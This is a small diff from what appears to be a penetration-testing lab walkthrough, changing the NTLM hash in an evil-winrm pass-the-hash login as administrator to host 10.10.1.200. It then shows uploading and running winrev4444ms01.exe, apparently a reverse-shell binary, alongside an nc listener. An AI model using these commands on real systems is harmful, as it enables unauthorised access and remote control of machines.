@@ -395,7 +395,7 @@ nc -nvlp 443
 
 
 On DC1:
-evil-winrm -i 10.10.1.200 -u administrator -H 2345hjkh2345jkh25432
+evil-winrm -i 10.10.1.200 -u administrator -H e728ecbadfb02f51ce8eed753f3ff3fd
 upload winrev4444ms01.exe
 dir
 .\winrev4444ms01.exe
